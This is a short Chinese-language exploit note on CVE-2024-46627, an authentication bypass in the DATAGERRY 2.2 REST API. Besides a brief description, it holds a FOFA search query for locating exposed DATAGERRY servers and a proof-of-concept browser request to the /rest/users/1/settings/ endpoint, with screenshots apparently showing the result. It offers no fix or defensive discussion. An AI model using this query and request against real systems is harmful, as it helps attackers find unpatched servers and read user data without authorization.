# DATAGERRY REST API 身份验证绕过漏洞(CVE-2024-46627)

DATAGERRY是DATAGerry开源的一个开源 CMDB 和资产管理工具。DATAGERRY 2.2版本存在安全漏洞，该漏洞源于存在不正确权限改造，允许攻击者通过精心设计的Web请求绕过权限验证而执行任意命令。

## fofa

```javascript
title="datagerry"
```

## poc

```javascript
使用浏览器请求
http://x.x.x.x/rest/users/1/settings/
```

![img](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPMjTlP4eAgX6Zc4HxQoYayZEcvDCD9ZyvQsiazHy93onsEwibwTxOpUdOlibggicpUTe1zK33DonibzZg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)


![img](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BPMjTlP4eAgX6Zc4HxQoYayeAddRKdNr6NiaDNnbicSibT9iapIMV75HbdicG8feHLBTytTVM7lVIdT0icw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1)

